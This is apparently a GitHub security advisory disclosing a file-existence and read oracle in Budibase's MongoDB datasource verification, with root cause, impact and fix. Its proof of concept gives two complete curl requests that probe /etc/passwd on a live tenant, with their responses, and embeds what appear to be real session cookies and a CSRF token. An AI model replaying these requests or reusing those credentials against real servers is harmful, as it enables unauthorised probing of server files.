# [H]  Budibase: Server Filesystem Existence/Read Oracle via Builder-Controlled MongoDB tlsCertificateKeyFile

## Summary
Severity: High
Advisory: GHSA-ppr4-5f46-j9c6
CVE: CVE-2026-73409
CWE: CWE-209
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N (CVSS_V4)
Published: 2026-07-24
Source: https://github.com/advisories/GHSA-ppr4-5f46-j9c6
Type: github-advisory

## Affected
- npm: `@budibase/server` — affected >=0

## Details
## Summary
When creating a MongoDB datasource, Budibase passes the `tlsCertificateKeyFile` and `tlsCAFile` fields straight to the MongoDB driver as server-side file paths. On Budibase Cloud a customer cannot place files on the server, so these fields only let a builder reference arbitrary absolute paths on the underlying multi-tenant server. When the datasource is verified, the driver performs a real filesystem read of that path, and the error differs by file state, turning `/api/datasources/verify` into an arbitrary-path existence/read oracle over the whole server filesystem.

## Root Cause
`packages/server/src/integrations/mongodb.ts` passes `config.tlsCertificateKeyFile` / `config.tlsCAFile` directly to `new MongoClient(config.connectionString, options)` as filesystem paths, with no allow-list, no confinement to a certificates directory, and no rejection of absolute / `..` paths.

POC 
## Reproduction — paste each line, press Enter

Line 1 (existing file — proves the file is READ):
```
curl -s -X POST "https://hasinocompany.budibase.app/api/datasources/verify" -H "Cookie: budibase:auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uSWQiOiJlNDYzZTM0Ni1hZmQ2LTQwNDEtODNmMS1hYmNlNzhjMmExN2QiLCJ1c2VySWQiOiJ1c19jMGY4NDE0NjAxYmQ0ZTk0YTJmMTEzMTAxYzVlNzZkNCIsImVtYWlsIjoiY3liZXJAaGFzaW5vc2VjLmxhdCIsImNzcmZUb2tlbiI6ImU5ZDJlZjQ4LTJiNmEtNDJhZC1hN2ViLTY1NzkzZDg3ZDdlYyIsInRlbmFudElkIjoiaGFzaW5vY29tcGFueSIsImlhdCI6MTc4NDAzNTU1NywiZXhwIjoxNzg0NjQwMzU3fQ.oaxPeSwQ571QDd7pPZZy-G0b4rpI6-wYQqcV2Urwlo8; budibase:auth.sig=exoCxnKfj6IDWg6z04bX4dUcPN0" -H "x-csrf-token: e9d2ef48-2b6a-42ad-a7eb-65793d87d7ec" -H "x-budibase-app-id: app_dev_hasinocompany_bcb6316e0d014f91939c812389012415" -H "Content-Type: application/json" -d '{"datasource":{"name":"probe","source":"MONGODB","type":"datasource","config":{"connectionString":"mongodb://127.0.0.1:27017/?tls=true","database":"x","tlsCertificateKeyFile":"/etc/passwd"}}}'
```

RESPONSE

{"connected":false,"error":"error:0480006C:PEM routines::no start line"} 



Line 2 (missing file — path is reflected):
```
curl -s -X POST "https://hasinocompany.budibase.app/api/datasources/verify" -H "Cookie: budibase:auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uSWQiOiJlNDYzZTM0Ni1hZmQ2LTQwNDEtODNmMS1hYmNlNzhjMmExN2QiLCJ1c2VySWQiOiJ1c19jMGY4NDE0NjAxYmQ0ZTk0YTJmMTEzMTAxYzVlNzZkNCIsImVtYWlsIjoiY3liZXJAaGFzaW5vc2VjLmxhdCIsImNzcmZUb2tlbiI6ImU5ZDJlZjQ4LTJiNmEtNDJhZC1hN2ViLTY1NzkzZDg3ZDdlYyIsInRlbmFudElkIjoiaGFzaW5vY29tcGFueSIsImlhdCI6MTc4NDAzNTU1NywiZXhwIjoxNzg0NjQwMzU3fQ.oaxPeSwQ571QDd7pPZZy-G0b4rpI6-wYQqcV2Urwlo8; budibase:auth.sig=exoCxnKfj6IDWg6z04bX4dUcPN0" -H "x-csrf-token: e9d2ef48-2b6a-42ad-a7eb-65793d87d7ec" -H "x-budibase-app-id: app_dev_hasinocompany_bcb6316e0d014f91939c812389012415" -H "Content-Type: application/json" -d '{"datasource":{"name":"probe","source":"MONGODB","type":"datasource","config":{"connectionString":"mongodb://127.0.0.1:27017/?tls=true","database":"x","tlsCertificateKeyFile":"/nonexistent/pentest/xyz"}}}'
```

RESPONSE

{"connected":false,"error":"ENOENT: no such file or directory, open '/nonexistent/pentest/xyz'"}


### Actual output
```text
/etc/passwd               -> {"connected":false,"error":"error:0480006C:PEM routines::no start line"}          (EXISTS, was READ)
/nonexistent/pentest/xyz  -> {"connected":false,"error":"ENOENT: no such file or directory, open '/nonexistent/pentest/xyz'"}   (MISSING, path reflected)
```
Existing files return a "PEM routines" error (the file was read but is not PEM); missing files return `ENOENT ... open '<path>'` with the path echoed back. This confirms a real filesystem read at the attacker-chosen absolute path. Confirmed 3/3 separate runs.



## Impact
| Who / what is affected | How |
|---|---|
| The underlying multi-tenant Cloud server | Arbitrary-path existence/read oracle from a builder account |
| Server config / secret files, other tenants' paths | Located by enumerating paths (exists vs missing) |
| PEM/certificate files on the server | Content exfiltratable via mutual-TLS to an attacker MongoDB server (mechanism) |

## Recommended Fix
1. On managed/Cloud, disallow `tlsCertificateKeyFile` / `tlsCAFile` as filesystem paths; accept PEM content and write it to a per-connection temp file under a fixed directory.
2. Reject absolute and `..` paths; confine any file reference to an allow-listed certificates directory.
3. Route the MongoDB connection host through the SSRF blacklist, as the REST integration already does.

## References
- https://github.com/Budibase/budibase/security/advisories/GHSA-ppr4-5f46-j9c6
- https://github.com/Budibase/budibase/pull/19244
- https://github.com/Budibase/budibase/commit/5e19b935536d6d1be1f47100e43c6fb30917826e
- https://github.com/Budibase/budibase
- https://github.com/Budibase/budibase/releases/tag/3.40.0
